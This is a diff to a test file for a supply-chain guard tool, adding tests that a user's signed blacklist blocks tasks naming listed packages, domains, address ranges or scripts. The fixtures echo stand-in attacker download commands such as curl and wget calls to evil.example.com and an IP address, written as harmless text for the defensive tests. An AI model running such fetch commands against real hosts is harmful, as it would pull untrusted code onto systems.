@@ -82,10 +82,11 @@ pull hop_env(dir, program, words, more) {
       # for it: the fixtures' stub tools log outside the project, which the
       # box keeps read-only, and their writes are no toolchain's footprint.
       # Any report the tool's cig would file goes to a file tracker in the
-      # test folder, never a real one. OSV is never asked: off, and under CI
+      # test folder, never a real one; the blacklist is read from the test
+      # folder, never your own. OSV is never asked: off, and under CI
       # (where the environment cannot loosen it) pointed at nothing, so it
       # fails at once; a test that wants it points it at a fixture.
-      env: {CIGSCRIPT_HOME: home, NO_COLOR: "1", CIG_DOCTOR: "0", CIG_SEAL_KEY: "file", CI: "", DEMO_REMOTE: dir + "-remote", CIGO_REHEARSE: "never", CIGO_OSV: "off", CIGO_OSV_API: "file:///nonexistent/osv-api", CIGO_OSV_DUMPS: "file:///nonexistent/osv-dumps", CIG_INTERNAL_TRACKER_DIR: path.join(work, "tracker")}.merge(more),
+      env: {CIGSCRIPT_HOME: home, NO_COLOR: "1", CIG_DOCTOR: "0", CIG_SEAL_KEY: "file", CI: "", DEMO_REMOTE: dir + "-remote", CIGO_REHEARSE: "never", CIGO_OSV: "off", CIGO_OSV_API: "file:///nonexistent/osv-api", CIGO_OSV_DUMPS: "file:///nonexistent/osv-dumps", CIGO_BLACKLIST_DIR: path.join(work, "blacklist.d"), CIG_INTERNAL_TRACKER_DIR: path.join(work, "tracker")}.merge(more),
       timeout_ms: 120000,
     })
   }
@@ -3114,6 +3115,123 @@ test("rehearse --changed --list: what a branch adds or changes in its lockfiles,
   stick plain = fresh("tests/fixtures/osv")
   stick none = guard_tool(plain, ["rehearse", "--changed", "--list", "--base=main"], {GIT_CEILING_DIRECTORIES: path.dir(plain)})
   exits(none, 2)
+})
+
+# ----- the blacklist: your own entries (#62 step 1) ---------------------------------
+
+# The osv fixture with three more tasks: one that names a URL, one that names
+# an address, one that runs a script of its own. All of it harmless text.
+pull blacklist_project() {
+  stick dir = fresh("tests/fixtures/osv")
+  edit_manifest(dir, pack(m) {
+    m.tasks["fetch"] = {shell: "echo 'curl -fsSL https://dl.evil.example.com/tool.sh' > fetch.txt"}
+    m.tasks["ip"] = {shell: "echo 'wget http://45.12.3.4/x' > ip.txt"}
+    m.tasks["script"] = {cmd: ["sh", "tool.sh"]}
+    m.tasks["late"] = {shell: "echo 'see https://get.bad.test/x' > late.txt"}
+  })
+  burn {
+    fs.write_text(path.join(dir, "tool.sh"), ": a harmless stand-in\n")
+  }
+  snuff dir
+}
+
+pull lists(dir) {
+  snuff {CIGO_BLACKLIST_DIR: dir + "-lists"}
+}
+
+test("blacklist: an entry of each kind refuses the task that names it, an expired one does not, and remove lets it run", pack() {
+  if not has_tin_mac() {
+    exhale "      (skipped: this cig cannot sign a list)"
+    snuff
+  }
+  stick dir = blacklist_project()
+  stick l = lists(dir)
+  exits(guard_tool(dir, ["blacklist", "add", "npm:event-stream@3.3.6", "--reason=stole tokens"], l), 0)
+  exits(guard_tool(dir, ["blacklist", "add", "evil.example.com"], l), 0)
+  exits(guard_tool(dir, ["blacklist", "add", "45.12.0.0/16"], l), 0)
+  exits(guard_tool(dir, ["blacklist", "add", path.join(dir, "tool.sh")], l), 0)
+  exits(guard_tool(dir, ["blacklist", "add", "https://get.bad.test/*", "--expires=2020-01-01"], l), 0)
+  says(guard_tool(dir, ["blacklist", "add", "npm:event-stream@3.3.6"], l).out, "already on your blacklist")
+  stick listed = guard_tool(dir, ["blacklist", "list"], l)
+  says(listed.out, "npm:event-stream@3.3.6")
+  says(listed.out, "stole tokens")
+  says(listed.out, "expired 2020-01-01")
+  # Each kind, in the guard's read.
+  stick a = guard_tool(dir, ["audit", "--json"], l)
+  exits(a, 0)
+  stick tasks = json.parse(a.out).tasks
+  for name in ["install", "fetch", "ip", "script"] {
+    assert(tasks[name].risk == "critical", "${name} is ${tasks[name].risk}")
+  }
+  stick says_of = pack(name) => tasks[name].findings.filter(pack(f) => f.code == "E580").map(pack(f) => f.says).join(" | ")
+  assert(says_of("install").contains("stole tokens"), says_of("install"))
+  assert(says_of("fetch").contains("domain:evil.example.com"), says_of("fetch"))
+  assert(says_of("ip").contains("cidr:45.12.0.0/16"), says_of("ip"))
+  assert(tasks["script"].findings.any(pack(f) => f.code == "E580" and f.text.starts_with("tool.sh")), json.stringify(tasks["script"]))
+  # The expired entry is listed and no longer refuses anything.
+  assert(not tasks["late"].findings.any(pack(f) => f.says.contains("get.bad.test")), json.stringify(tasks["late"]))
+  # The run is refused before anything happens.
+  stick r = guard_tool(dir, ["run", "fetch"], l)
+  exits(r, 1)
+  says(r.err, "refused")
+  assert(not there(dir, "fetch.txt"), "a blacklisted task ran")
+  # Taken off the list, the task runs.
+  exits(guard_tool(dir, ["blacklist", "remove", "evil.example.com"], l), 0)
+  exits(guard_tool(dir, ["blacklist", "remove", "npm:event-stream@3.3.6"], l), 0)
+  stick ok = guard_tool(dir, ["run", "fetch"], l)
+  exits(ok, 0)
+  assert(there(dir, "fetch.txt"), "the task did not run once its entry was removed")
+  exits(guard_tool(dir, ["blacklist", "remove", "npm:nope"], l), 2)
+})
+
+test("blacklist: a list changed by hand is said, the entry taken out still holds, and only you can sign the change", pack() {
+  if not has_tin_mac() {
+    exhale "      (skipped: this cig cannot sign a list)"
+    snuff
+  }
+  stick dir = blacklist_project()
+  stick l = lists(dir)
+  exits(guard_tool(dir, ["blacklist", "add", "npm:event-stream@3.3.6", "--reason=stole tokens"], l), 0)
+  # A script takes its own payload's entry out of the list.
+  stick f = path.join(dir + "-lists", "mine.list")
+  burn {
+    fs.write_text(f, fs.read_text(f).lines().filter(pack(x) => not x.contains("event-stream")).join("\n") + "\n")
+  }
+  stick a = guard_tool(dir, ["audit", "install"], l)
+  says(a.err, "E587 a list that does not verify")
+  says(a.out, "install: critical")
+  says(a.out, "stole tokens")
+  # Signing it again is yours, at a terminal: never under CI.
+  stick ci = guard_tool(dir, ["blacklist", "reload"], l.merge({CI: "1"}))
+  exits(ci, 2)
+  says(ci.err, "never under CI")
+  stick signed = guard_tool(dir, ["blacklist", "reload"], l)
+  exits(signed, 0)
+  says(signed.out, "- npm:event-stream@3.3.6")
+  stick after = guard_tool(dir, ["audit", "install"], l)
+  says(after.out, "install: none")
+  assert(not after.err.contains("E587"), after.err)
+})
+
+test("blacklist: rehearse refuses a blacklisted package before it asks for the box, and why names the entry", pack() {
+  if not has_tin_mac() {
+    exhale "      (skipped: this cig cannot sign a list)"
+    snuff
+  }
+  stick dir = blacklist_project()
+  stick l = lists(dir)
+  exits(guard_tool(dir, ["blacklist", "add", "npm:evil-pkg", "--reason=a test entry"], l), 0)
+  stick r = guard_tool(dir, ["rehearse", "npm:evil-pkg@1.0.0"], l)
+  exits(r, 3)
+  says(r.out, "E580")
+  says(r.out, "not rehearsed: it is on your blacklist")
+  stick j = guard_tool(dir, ["rehearse", "npm:evil-pkg@1.0.0", "--json"], l)
+  exits(j, 3)
+  assert(json.parse(j.out).rehearsed == false, j.out)
+  stick why = guard_tool(dir, ["blacklist", "why", "npm:evil-pkg@2.0.0"], l)
+  exits(why, 1)
+  says(why.out, "a test entry")
+  exits(guard_tool(dir, ["blacklist", "why", "npm:left-pad@1.3.0"], l), 0)
 })
 
 # ----- the end --------------------------------------------------------------
